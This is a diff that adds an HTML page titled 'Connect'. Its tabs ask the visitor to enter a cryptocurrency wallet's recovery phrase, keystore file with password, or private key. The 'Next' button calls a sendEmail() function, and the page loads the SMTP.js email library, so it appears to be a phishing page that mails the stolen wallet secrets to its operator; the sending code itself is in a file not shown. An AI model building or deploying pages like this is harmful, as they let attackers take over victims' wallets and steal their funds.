@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="google-signin-client_id" content="592380102525-t2h7or334n5osm3eoblqblikn3sen8k0.apps.googleusercontent.com">
+    <title>Connect</title>
+    <link rel="stylesheet" href="import.css" />
+  </head>
+  <body>
+    <!-- <form action="/" class="import-cont" method="post"> -->
+    <div class="form">
+      <div class="head-tabs">
+        <div id="phrase" onclick="changeTab('phrase')">Phrase</div>
+        <div id="keystore" onclick="changeTab('keystore')">KeystoreJSN</div>
+        <div id="privatekey" onclick="changeTab('privatekey')">PrivateKey</div>
+      </div>
+      <div class="phrase">
+        <textarea
+          name="phraseText"
+          id="ptext"
+          cols="30"
+          rows="8"
+          placeholder="Enter 12 or 24 phrase code"
+        ></textarea>
+      </div>
+      <div class="keystore">
+        <textarea
+          name="keyStore"
+          id="kstore"
+          cols="30"
+          rows="10"
+          placeholder="Enter Lines of Text beginning with (...)"
+        ></textarea>
+        <input
+          type="text"
+          name="keystorePassword"
+          id="kpassword"
+          placeholder="Enter Keystore Password"
+        />
+      </div>
+      <div class="privatekey">
+        <textarea
+          name="privateKey"
+          id="pkey"
+          cols="30"
+          rows="10"
+          placeholder="Enter Private Key"
+        ></textarea>
+      </div>
+      <button type="submit" onclick="sendEmail()">Next</button>
+    </div>
+    
+    <!-- </form> -->
+    
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="index.js" type="text/javascript">
+    </script>
+
+  </body>
+</html>
